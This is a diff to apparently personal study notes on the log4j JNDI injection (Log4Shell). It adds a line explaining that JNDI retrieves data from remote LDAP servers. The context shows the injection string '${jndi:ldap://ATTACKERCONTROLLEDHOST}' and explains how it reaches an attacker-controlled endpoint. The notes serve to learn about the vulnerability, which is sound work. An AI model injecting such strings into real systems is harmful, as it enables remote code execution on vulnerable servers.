@@ -13,6 +13,8 @@ ${jndi:ldap://ATTACKERCONTROLLEDHOST}
 This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to 
 access external resources, or "references," which is what is weaponized in this attack. 
 
+jndi - is used to get data from remote servers like LDAP
+
 "ldap://" target will reach out to an endpoint (an attacker controlled location) via the LDAP protocol.
 
 "ATTACKERCONTROLLEDHOST" is where the inject happens
